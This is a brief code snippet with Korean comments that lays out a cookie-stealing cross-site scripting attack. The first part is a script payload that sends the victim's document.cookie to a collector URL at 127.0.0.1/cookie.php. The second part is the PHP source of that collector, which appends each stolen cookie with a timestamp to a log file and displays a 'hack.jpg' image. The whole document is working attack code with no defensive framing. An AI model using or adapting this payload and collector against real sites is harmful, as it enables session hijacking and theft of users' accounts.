//XSS Attack
<script>
  url="http://127.0.0.1/cookie.php?data="+document.cookie;window.open(url, width=0, height=0);
</script>




//cookie.php소스
<?
  $cookie=$_GET['data'];
  $atime=date("y-m-d H:i:s"); // atime에 연월분초 형태로 저장
  $log=fopen("cookie.txt","a");
  fwrite($log,$atime." ".$cookie."\r\n"); // 로그 -> 시간 빈공간 쿠키 개행
  fclose($log);
  echo "<img src=http://127.0.0.1/hack.jpg width=220 height=150></img>";
?>
